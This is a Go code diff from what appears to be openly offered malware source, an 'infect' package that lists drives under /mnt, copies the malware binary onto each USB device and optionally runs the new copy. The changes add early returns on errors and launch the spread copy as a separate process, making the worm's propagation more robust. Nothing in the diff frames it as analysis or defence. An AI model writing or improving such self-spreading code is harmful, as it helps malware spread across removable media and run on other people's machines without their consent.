@@ -23,6 +23,9 @@ var c_infect = infect_t{0, false}
 
 func Set_infection_count(count string) {
 	counter := converter.String_to_int(count, "infect.Set_infection_count()")
+	if counter == -1 {
+		return
+	}
 	c_infect.count = counter
 }
 func Set_start_after_birth() {
@@ -35,6 +38,7 @@ func USB() {
 		usb_devices, err := os.ReadDir("/mnt")
 		if err != nil {
 			notify.Error(err.Error(), "infect.USB()")
+			return
 		}
 		for _, line := range usb_devices {
 			Disk(line.Name())
@@ -55,6 +59,7 @@ func Disk(location string) {
 	if err != nil {
 		in.Close()
 		notify.Error(err.Error(), "infect.Disk()")
+		return
 	}
 	if !contains.EndsWith(location, []string{"/"}) {
 		location += "/"
@@ -66,9 +71,10 @@ func Disk(location string) {
 	_, err = io.Copy(dst, in)
 	if err != nil {
 		notify.Error(err.Error(), "infect.Disk()")
+		return
 	}
 	if c_infect.start_after_birth { // Start the newly created malware
-		iio.Run_file(location + malware.GetName())
+		go iio.Run_file(location + malware.GetName()) // Spawns a new process
 	}
 
 }
